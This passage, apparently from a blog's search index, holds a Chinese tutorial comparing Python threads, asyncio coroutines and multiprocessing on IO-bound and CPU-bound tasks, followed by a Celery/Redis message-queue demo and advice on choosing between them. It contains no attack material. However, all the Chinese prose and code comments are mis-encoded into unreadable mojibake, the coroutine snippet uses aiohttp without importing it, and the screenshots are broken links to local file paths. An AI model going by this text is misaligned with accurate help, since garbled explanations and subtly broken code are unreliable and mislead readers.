asyncio.get_event_loop()</span><br><span class="line">    results = loop.run_until_complete(request_baidu())</span><br><span class="line">    end_time = time.time()</span><br><span class="line">    execution_time = end_time - start_time</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;åç¨‹æ‰§è¡Œè€—æ—¶ï¼š&quot;</span>, execution_time)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è°ƒç”¨æ¯”è¾ƒå‡½æ•°</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    compare_execution_time()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ‰§è¡Œç»“æœå¦‚ä¸‹ï¼š</p>
<p>![image-20230904141410552](&#x2F;Users&#x2F;geez&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20230904141410552.png)</p>
<p>å¯ä»¥çœ‹åˆ°åç¨‹é€Ÿåº¦é£å¿«ï¼Œ</p>
<p>æˆ‘ä»¬å†æ¢æˆIOéå¯†é›†æ“ä½œä»…ä½œç®—æ•°è®¡ç®—ï¼ŒåŒæ ·éƒ½è®¡ç®—500æ¬¡ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ™®é€šæ‰§è¡Œç‰ˆæœ¬</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">normal_execution</span>():</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">        result = <span class="number">99999</span>+<span class="number">54673829</span></span><br><span class="line">        <span class="comment"># response = requests.get(&quot;https://www.baidu.com&quot;)</span></span><br><span class="line">        <span class="comment"># print(response)</span></span><br><span class="line">    end_time = time.time()</span><br><span class="line">    execution_time = end_time - start_time</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;æ™®é€šæ‰§è¡Œè€—æ—¶ï¼š&quot;</span>, execution_time)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¤šçº¿ç¨‹æ‰§è¡Œç‰ˆæœ¬</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">threaded_execution</span>():</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    threads = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">thread_function</span>():</span><br><span class="line">        result = <span class="number">99999</span>+<span class="number">54673829</span></span><br><span class="line">        <span class="comment"># response = requests.get(&quot;https://www.baidu.com&quot;)</span></span><br><span class="line">        <span class="comment"># print(response)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">        thread = threading.Thread(target=thread_function)</span><br><span class="line">        threads.append(thread)</span><br><span class="line">        thread.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">        thread.join()</span><br><span class="line"></span><br><span class="line">    end_time = time.time()</span><br><span class="line">    execution_time = end_time - start_time</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;å¤šçº¿ç¨‹æ‰§è¡Œè€—æ—¶ï¼š&quot;</span>, execution_time)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">fetch</span>(<span class="params">session</span>):</span><br><span class="line">    result = <span class="number">99999</span>+<span class="number">54673829</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">request_baidu</span>():</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> aiohttp.ClientSession() <span class="keyword">as</span> session:</span><br><span class="line">        tasks = []</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">            task = asyncio.ensure_future(fetch(session))</span><br><span class="line">            tasks.append(task)</span><br><span class="line">        responses = <span class="keyword">await</span> asyncio.gather(*tasks)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¯”è¾ƒå‡½æ•°</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compare_execution_time</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;å¼€å§‹æ™®é€šæ‰§è¡Œ...&quot;</span>)</span><br><span class="line">    normal_execution()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nå¼€å§‹å¤šçº¿ç¨‹æ‰§è¡Œ...&quot;</span>)</span><br><span class="line">    threaded_execution()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nå¼€å§‹åç¨‹æ‰§è¡Œ...&quot;</span>)</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    loop = asyncio.get_event_loop()</span><br><span class="line">    results = loop.run_until_complete(request_baidu())</span><br><span class="line">    end_time = time.time()</span><br><span class="line">    execution_time = end_time - start_time</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;åç¨‹æ‰§è¡Œè€—æ—¶ï¼š&quot;</span>, execution_time)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è°ƒç”¨æ¯”è¾ƒå‡½æ•°</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    compare_execution_time()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ‰§è¡Œç»“æœï¼š</p>
<p>![image-20230904141620788](&#x2F;Users&#x2F;geez&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20230904141620788.png)</p>
<p>å¯ä»¥çœ‹åˆ°åç¨‹é€Ÿåº¦è™½ç„¶æ¯”å¤šçº¿ç¨‹å¿«ï¼Œä½†è¿˜ä¸å¦‚å•çº¿ç¨‹ï¼Œè¿™å°±åˆå›åˆ°äº†å‰é¢é‚£æ ·ï¼Œåœ¨è®¡ç®—å¯†é›†å‹è®¡ç®—ä¸­åç¨‹å’Œå¤šçº¿ç¨‹éƒ½æ˜¯å¼Ÿå¼Ÿæ°´å¹³ã€‚ä½†æ˜¯åç¨‹åº¦åˆç¡®å®æ¯”å¤šçº¿ç¨‹å¿«ï¼Œé‚£æ˜¯ä¸æ˜¯ä»¥åéœ€è¦ç”¨åˆ°å¤šçº¿ç¨‹çš„åœ°æ–¹ç›´æ¥ç”¨åç¨‹å°±è¡Œï¼Ÿ</p>
<p>å½“ç„¶ä¸æ˜¯ï¼Œå¦‚æœæ³¨æ„è§‚å¯Ÿå¯ä»¥çœ‹åˆ°ä¸Šè¿°ä»£ç ä¸­è¯·æ±‚ç™¾åº¦çš„åº“ï¼Œåˆ«çš„ä»£ç ä½¿ç”¨çš„æ˜¯requestsï¼Œè€Œåç¨‹ä½¿ç”¨çš„æ˜¯aiohttpï¼Œè¿™æ˜¯å› ä¸ºrequestsä¸æ”¯æŒå¼‚æ­¥ï¼Œä¹Ÿå°±æ²¡åŠæ³•æ”¯æŒåç¨‹ã€‚å¦å¤–åç¨‹çš„ç¼–ç¨‹å¤æ‚åº¦ä¹Ÿé«˜äºå¤šçº¿ç¨‹ã€‚æ‰€ä»¥å¾ˆå¤šæ—¶å€™åœ¨åç¨‹åº“ä¸æ”¯æŒæˆ–æ˜¯åç¨‹å¤æ‚åº¦å®ç°ä¸èƒ½æ¥å—çš„æ—¶å€™ï¼Œå¯ä»¥è€ƒè™‘ä½¿ç”¨å¤šçº¿ç¨‹ã€‚</p>
<p><strong>ç»“è®ºï¼š</strong></p>
<p>CPUå¯†é›†å‹æ“ä½œåç¨‹é€Ÿåº¦å¤§äºå¤šçº¿ç¨‹ä½†ä¸å¦‚å•çº¿ç¨‹ï¼ŒIOå¯†é›†å‹æ“ä½œåç¨‹è¿œè¿œå¤§äºå¤šçº¿ç¨‹å’Œå•çº¿ç¨‹ã€‚</p>
<h2 id="å¤šè¿›ç¨‹"><a href="#å¤šè¿›ç¨‹" class="headerlink" title="å¤šè¿›ç¨‹"></a>å¤šè¿›ç¨‹</h2><p>ä¸Šé¢çš„æ¯”è¾ƒåˆå¼•å‡ºä¸€ä¸ªæ–°çš„é—®é¢˜ï¼ŒCPUå¯†é›†å‹çš„è¿ç®—ä¸­ éš¾é“å°±åªèƒ½ä½¿ç”¨å•çº¿ç¨‹å—ï¼Ÿ</p>
<p>å½“ç„¶ä¸æ˜¯ï¼Œè¿™é‡Œæˆ‘ä»¬å¼•å…¥å¤šè¿›ç¨‹çš„æ¦‚å¿µï¼š</p>
<ul>
<li>Pythonä¸­çš„å¤šè¿›ç¨‹æ˜¯æŒ‡åŒæ—¶è¿è¡Œå¤šä¸ªç‹¬ç«‹è¿›ç¨‹çš„èƒ½åŠ›ã€‚æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰è‡ªå·±ç‹¬ç«‹çš„å†…å­˜ç©ºé—´å’Œèµ„æºï¼Œå¯ä»¥å¹¶è¡Œåœ°æ‰§è¡Œä»»åŠ¡ã€‚è¿™ç§å¹¶è¡Œå’Œç‹¬ç«‹çš„ç‰¹æ€§ä½¿å¾—å¤šè¿›ç¨‹åœ¨å¤„ç†è®¡ç®—å¯†é›†å‹ä»»åŠ¡å’Œæé«˜CPUåˆ©ç”¨ç‡æ–¹é¢éå¸¸æœ‰æ•ˆã€‚Pythonæä¾›äº†multiprocessingæ¨¡å—æ¥æ”¯æŒå¤šè¿›ç¨‹ç¼–ç¨‹</li>
</ul>
<p>æµ‹è¯•CPUå¯†é›†å‹è®¡ç®—:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cpu_intensive_calculation</span>():</span><br><span class="line">    total = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20000000</span>):</span><br><span class="line">        total += i</span><br><span class="line">    <span class="keyword">return</span> total</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">single_threaded</span>():</span><br><span class="line">    start_time = time.time()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        cpu_intensive_calculation()</span><br><span class="line"></span><br><span class="line">    end_time = time.time()</span><br><span class="line">    elapsed_time = end_time - start_time</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;å•çº¿ç¨‹æ‰§è¡Œè€—æ—¶: <span class="subst">&#123;elapsed_time&#125;</span> seconds&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">multi_process1</span>():</span><br><span class="line">    start_time = time.time()</span><br><span class="line"></span><br><span class="line">    num_processes = multiprocessing.cpu_count()  <span class="comment"># è·å–CPUæ ¸å¿ƒæ•°é‡ 8ä¸ª</span></span><br><span class="line">    <span class="built_in">print</span>(num_processes)</span><br><span class="line">    num_tasks = <span class="number">5000</span></span><br><span class="line"></span><br><span class="line">    processes = []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(num_processes):</span><br><span class="line">        process = multiprocessing.Process(target=cpu_intensive_calculation)</span><br><span class="line">        processes.append(process)</span><br><span class="line">        process.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> process <span class="keyword">in</span> processes:</span><br><span class="line">        process.join()</span><br><span class="line">    end_time = time.time()</span><br><span class="line">    elapsed_time = end_time - start_time</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;å¤šè¿›ç¨‹æ‰§è¡Œè€—æ—¶: <span class="subst">&#123;elapsed_time&#125;</span> seconds&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    single_threaded()</span><br><span class="line">    multi_process1()</span><br></pre></td></tr></table></figure>

<p>æ‰§è¡Œç»“æœå¦‚ä¸‹</p>
<p>![image-20230904143720227](&#x2F;Users&#x2F;geez&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20230904143720227.png)</p>
<p>å¯ä»¥çœ‹åˆ° å¤šè¿›ç¨‹åœ¨CPUå¯†é›†å‹è®¡ç®—ä¸­ä¼šæ›´æœ‰ä¼˜åŠ¿ä¸€ç‚¹ã€‚</p>
<h2 id="æ¶ˆæ¯é˜Ÿåˆ—"><a href="#æ¶ˆæ¯é˜Ÿåˆ—" class="headerlink" title="æ¶ˆæ¯é˜Ÿåˆ—"></a>æ¶ˆæ¯é˜Ÿåˆ—</h2><p>å…¶å®åç¨‹ä¸­å°±æœ‰å¼‚æ­¥çš„æ¦‚å¿µï¼Œæ¶ˆæ¯é˜Ÿåˆ—ä¹Ÿæœ‰ç‚¹å¼‚æ­¥çš„æ„æ€ï¼Œä¸¥æ ¼æ¥è¯´æ¶ˆæ¯é˜Ÿåˆ—å’Œçº¿ç¨‹ã€è¿›ç¨‹ä¸æ˜¯ä¸€ç±»æŠ€æœ¯ï¼Œå®ƒæ˜¯ä¸ºäº†è§£å†³å¦ä¸€ä¸ªé—®é¢˜ï¼šè§£è€¦ã€å¼‚æ­¥ã€å‰Šå³°ã€‚</p>
<p>è§£è€¦ï¼šæ¯”å¦‚æ‰“å¡ç³»ç»Ÿå’Œè€ƒå‹¤ç³»ç»Ÿæ˜¯å…³è”çš„ï¼Œé‚£ä¹ˆå¦‚æœä¸­é—´åŠ å…¥æ¶ˆæ¯é˜Ÿåˆ—ï¼Œæ‰“å¡ç³»ç»Ÿå°±åªéœ€è¦æŠŠæ‰“å¡çš„æ•°æ®æ”¾å…¥æ¶ˆæ¯é˜Ÿåˆ—ç”±è€ƒå‹¤ç³»ç»Ÿå»å–å°±è¡Œã€‚ä¸å¿…å…³å¿ƒè¿™ä¸¤è€…ç³»ç»Ÿçš„å…³è”ã€‚</p>
<p>å¼‚æ­¥ï¼šå¤šäººæ‰“å¡æ—¶å¯èƒ½æ¯ä¸ªæ‰“å¡åˆ°éƒ½éœ€è¦è®°å½•åˆ°è€ƒå‹¤ç³»ç»Ÿï¼Œä½†ä¸å¯èƒ½æ¯ä¸ªäººéƒ½æ˜¯æ‰“å®Œå¡è®°å½•å®Œä»¥åæ‰èƒ½ä¸‹ä¸€ä¸ªäººæ‰“å¼€ï¼Œæ¶ˆæ¯é˜Ÿåˆ—å¯ä»¥å¼‚æ­¥å¤„ç†ã€‚ç®€å•è¯´å°±æ˜¯ æ‰“å¡æ—¶æ‰“å¡ï¼Œè€ƒå‹¤è®°å½•æ˜¯è€ƒå‹¤è®°å½•ï¼Œä¸­é—´ç”±æ¶ˆæ¯é˜Ÿåˆ—æä¾›ç¼“å­˜å’Œæ¶ˆæ¯ä¼ é€’ã€‚</p>
<p>å‰Šå³°ï¼šå¹¶å‘è®¿é—®é«˜å³°æœŸï¼Œå¯ä»¥ç¼“å­˜åˆ°ä¸­é—´ä»¶ä¸­å‡å°‘å¯¹å…¶ä»–ä»»åŠ¡çš„å‹åŠ›ã€‚æ¯”å¦‚å‘é€é‚®ä»¶æ˜¯è€—æ—¶åº”ç”¨ï¼Œæ¯å¤©å®šæœŸå‘é€çš„é‚®ä»¶å¯èƒ½æœ‰å‡ å°ï¼Œä½†æ˜¯ä¸€å®¶å…¬å¸å¯èƒ½æœ‰ä¸Šåƒäººï¼Œè¿™æ—¶å€™å‘é€é‚®ä»¶å°±å¯ä»¥è¿›å…¥æ¶ˆæ¯é˜Ÿåˆ—ï¼Œç„¶åå†æ…¢æ…¢å‘é€ï¼Œé˜²æ­¢æµé‡è¿‡è½½ã€‚</p>
<p><strong>æ¶ˆæ¯é˜Ÿåˆ—çš„ä½¿ç”¨demoï¼š</strong></p>
<p>1ã€å®‰è£…celeryå’Œredis</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip install celery</span><br></pre></td></tr></table></figure>
<p>2ã€åˆ›å»ºä½¿ç”¨celeryçš„åº”ç”¨</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> celery <span class="keyword">import</span> Celery</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»º Celery åº”ç”¨</span></span><br><span class="line">app = Celery(<span class="string">&#x27;myapp&#x27;</span>, broker=<span class="string">&#x27;redis://localhost:6379/0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®šä¹‰ä»»åŠ¡</span></span><br><span class="line"><span class="meta">@app.task</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="keyword">return</span> x + y</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>3ã€å¯åŠ¨celryæœåŠ¡ç«¯ï¼Œä¹Ÿå°±æ˜¯å¯åŠ¨æ¶ˆæ¯é˜Ÿåˆ—ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">celery -A tasks worker --loglevel=info</span><br></pre></td></tr></table></figure>

<p>4ã€å…¶ä»–å‡½æ•°è°ƒç”¨æ¶ˆæ¯é˜Ÿåˆ—</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tasks <span class="keyword">import</span> add</span><br><span class="line"></span><br><span class="line">result = add.delay(<span class="number">4</span>, <span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(result.get())</span><br></pre></td></tr></table></figure>

<p>ä»€ä¹ˆæ—¶å€™ä½¿ç”¨ï¼Ÿè€—æ—¶åº”ç”¨éœ€è¦è§£è€¦ã€å¼‚æ­¥ã€å‰Šå³°å¤„ç†æ—¶ä½¿ç”¨æ­¤æŠ€æœ¯ã€‚</p>
<p>æ¯”å¦‚ä¸€ä¸ªçˆ¬è™«ï¼Œå®ƒéœ€è¦çˆ¬å»ã€è§£æå†…å®¹ã€è®°å½•åˆ°æ•°æ®åº“ã€‚</p>
<p>é‚£æ¯ä¸ªä»»åŠ¡éƒ½å¯ä»¥å†™æˆå¤šçº¿ç¨‹ï¼Œç„¶åè¿›å…¥æ¶ˆæ¯é˜Ÿåˆ—ï¼Œä¸‹ä¸€ä¸ªä»»åŠ¡ç›´æ¥ä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­å–å¹¶ç»§ç»­å‹å…¥æ¶ˆæ¯é˜Ÿåˆ—ï¼š</p>
<h2 id="æ€ä¹ˆé€‰æ‹©"><a href="#æ€ä¹ˆé€‰æ‹©" class="headerlink" title="æ€ä¹ˆé€‰æ‹©"></a>æ€ä¹ˆé€‰æ‹©</h2><p>å¦‚æœæ˜¯CPUå¯†é›†å‹ä»»åŠ¡ï¼Œé‚£å½“ç„¶ç›´æ¥å¤šè¿›ç¨‹ã€‚</p>
<p>å¦‚æœæ˜¯IOå¯†é›†å‹ä»»åŠ¡ï¼Œå°±æœ‰ä¸¤ç§é€‰æ‹©å¤šçº¿ç¨‹å’Œåç¨‹ï¼Œå¦‚æœåç¨‹åº“æ”¯æŒä¸å®Œå–„ï¼Œä»£ç å¤æ‚åº¦è¶…å‡ºèƒ½åŠ›ã€‚é‚£å°±é€‰æ‹©å¤šçº¿ç¨‹ï¼Œå¦åˆ™é€‰æ‹©åç¨‹ï¼Œæ¯•ç«Ÿåç¨‹æ˜¯æ–°çš„æŠ€æœ¯ï¼Œåº”è¯¥æœ‰æ›´å¥½çš„é€Ÿåº¦è¡¨ç°ã€‚</p>
<p>å½“éœ€è¦ è§£è€¦ã€å¼‚æ­¥ã€å‰Šå³° æ—¶æˆ‘ä»¬è€ƒè™‘æ¶ˆæ¯é˜Ÿåˆ—å¹¶ç»“åˆä¸Šè¿°çš„æŠ€æœ¯è¿›è¡Œä¼˜åŒ–ã€‚</p>
<p>![image-20230905153811141](&#x2F;Users&#x2F;geez&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20230905153811141.png)</p>
<h2 id="å¤‡æ³¨"><a href="#å¤‡æ³¨" class="headerlink" title="å¤‡æ³¨"></a>å¤‡æ³¨</h2><p>éœ€è¦æ³¨æ„çš„æ˜¯è¿›ç¨‹ã€çº¿ç¨‹ã€åç¨‹ä¸æ˜¯å¹¶åˆ—å…³ç³»ï¼Œä»–ä»¬æ˜¯åŒ…å«å…³ç³»ã€‚è¿›ç¨‹åŒ…å«çº¿ç¨‹åŒ…å«åç¨‹ã€‚ä¹Ÿå°±æ˜¯è¯´ä¸€ä¸ªè¿›ç¨‹å¯ä»¥æœ‰å¤šä¸ªçº¿ç¨‹ä¸€ä¸ªçº¿ç¨‹å¯ä»¥æœ‰å¤šä¸ªè¿›ç¨‹ã€‚</p>
<p>ç”±äºæœ¬èº«ä¸æ˜¯ç¨‹åºå‘˜ï¼Œå¯¹ä»£ç ç†è§£æœ‰é™ï¼Œå¦‚æœæ–‡ä¸­æœ‰é”™è¯¯çš„åœ°æ–¹æ¬¢è¿è¯„è®ºåŒºæŒ‡å‡ºã€‚</p>
]]></content>
      <categories>
        <category>coding</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
</search>
